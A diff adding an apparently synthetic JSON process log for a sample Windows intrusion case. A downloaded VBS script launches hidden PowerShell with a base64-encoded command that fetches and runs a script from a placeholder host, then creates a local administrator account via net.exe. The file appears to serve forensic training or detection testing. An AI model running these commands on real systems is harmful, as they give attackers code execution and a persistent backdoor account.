@@ -1,0 +1,130 @@
+{
+  "schema_version": "1.0",
+  "case_id": "INC-001",
+  "device": "WIN-PC-01",
+  "source": "processes",
+  "collected_at": "2026-10-08T08:10:00Z",
+  "collector": {
+    "name": "sentinel-windows-collector",
+    "version": "0.1.0-sample"
+  },
+  "records": [
+    {
+      "record_id": "PROC-0001",
+      "timestamp": "2026-10-08T06:55:40Z",
+      "pid": 2210,
+      "ppid": 2180,
+      "name": "explorer.exe",
+      "executable_path": "C:\\Windows\\explorer.exe",
+      "command_line": "C:\\Windows\\explorer.exe",
+      "user": "ahmed",
+      "parent_name": "userinit.exe",
+      "sha256": "5c912d9b41a18d72f1c7a42cef93f905f74170f09bbfabaf828e7bbac5cf4ca0",
+      "origin": "live_snapshot"
+    },
+    {
+      "record_id": "PROC-0002",
+      "timestamp": "2026-10-08T07:02:40Z",
+      "pid": 5304,
+      "ppid": 2210,
+      "name": "chrome.exe",
+      "executable_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+      "user": "ahmed",
+      "parent_name": "explorer.exe",
+      "sha256": "2ae3d5584538c3591a5f2e2bc0cf420cb850a8e21fcc1747ade028f3dbccd6b2",
+      "origin": "live_snapshot"
+    },
+    {
+      "record_id": "PROC-0003",
+      "timestamp": "2026-10-08T07:15:03Z",
+      "pid": 3920,
+      "ppid": 1124,
+      "name": "powershell.exe",
+      "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -NoProfile -File C:\\IT\\Scripts\\disk-report.ps1",
+      "user": "svc_backup",
+      "parent_name": "svchost.exe",
+      "sha256": "5616f8219b305d89f1cddcd8b09237f2c464e0d5ff6080079c5510e6983e33d6",
+      "origin": "event_log"
+    },
+    {
+      "record_id": "PROC-0004",
+      "timestamp": "2026-10-08T07:32:58Z",
+      "pid": 4488,
+      "ppid": 4410,
+      "name": "explorer.exe",
+      "executable_path": "C:\\Windows\\explorer.exe",
+      "command_line": "C:\\Windows\\explorer.exe",
+      "user": "ahmed",
+      "parent_name": "userinit.exe",
+      "sha256": "5c912d9b41a18d72f1c7a42cef93f905f74170f09bbfabaf828e7bbac5cf4ca0",
+      "origin": "event_log"
+    },
+    {
+      "record_id": "PROC-0005",
+      "timestamp": "2026-10-08T07:33:52Z",
+      "pid": 5120,
+      "ppid": 4488,
+      "name": "wscript.exe",
+      "executable_path": "C:\\Windows\\System32\\wscript.exe",
+      "command_line": "\"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ahmed\\Downloads\\invoice_update.vbs\"",
+      "user": "ahmed",
+      "parent_name": "explorer.exe",
+      "sha256": "279eda845a3a11b6fc8c20c4c762f746bd2c5d5e218ee2915595c75bb4e814e0",
+      "origin": "event_log"
+    },
+    {
+      "record_id": "PROC-0006",
+      "timestamp": "2026-10-08T07:34:01Z",
+      "pid": 6012,
+      "ppid": 5120,
+      "name": "powershell.exe",
+      "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AZgBpAGwAZQBzAC0AcwB5AG4AYwAuAGUAeABhAG0AcABsAGUALgBuAGUAdAAvAHMAdABhAGcAZQAvAHUAcABkAGEAdABlAF8AcwB2AGMALgBwAHMAMQAnADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxADsAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxAA==",
+      "user": "ahmed",
+      "parent_name": "wscript.exe",
+      "sha256": "5616f8219b305d89f1cddcd8b09237f2c464e0d5ff6080079c5510e6983e33d6",
+      "origin": "event_log"
+    },
+    {
+      "record_id": "PROC-0007",
+      "timestamp": "2026-10-08T07:34:44Z",
+      "pid": 6188,
+      "ppid": 6012,
+      "name": "powershell.exe",
+      "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\update_svc.ps1",
+      "user": "ahmed",
+      "parent_name": "powershell.exe",
+      "sha256": "5616f8219b305d89f1cddcd8b09237f2c464e0d5ff6080079c5510e6983e33d6",
+      "origin": "event_log"
+    },
+    {
+      "record_id": "PROC-0008",
+      "timestamp": "2026-10-08T07:35:20Z",
+      "pid": 6240,
+      "ppid": 6188,
+      "name": "net.exe",
+      "executable_path": "C:\\Windows\\System32\\net.exe",
+      "command_line": "net.exe user svc_helpdesk [REDACTED] /add",
+      "user": "ahmed",
+      "parent_name": "powershell.exe",
+      "sha256": "b10b131c0cb09573f36977422860f39cdb5934055ce424e782c2fb2b150d0f8e",
+      "origin": "event_log"
+    },
+    {
+      "record_id": "PROC-0009",
+      "timestamp": "2026-10-08T07:35:30Z",
+      "pid": 6290,
+      "ppid": 6188,
+      "name": "net.exe",
+      "executable_path": "C:\\Windows\\System32\\net.exe",
+      "command_line": "net.exe localgroup Administrators svc_helpdesk /add",
+      "user": "ahmed",
+      "parent_name": "powershell.exe",
+      "sha256": "b10b131c0cb09573f36977422860f39cdb5934055ce424e782c2fb2b150d0f8e",
+      "origin": "event_log"
+    }
+  ]
+}
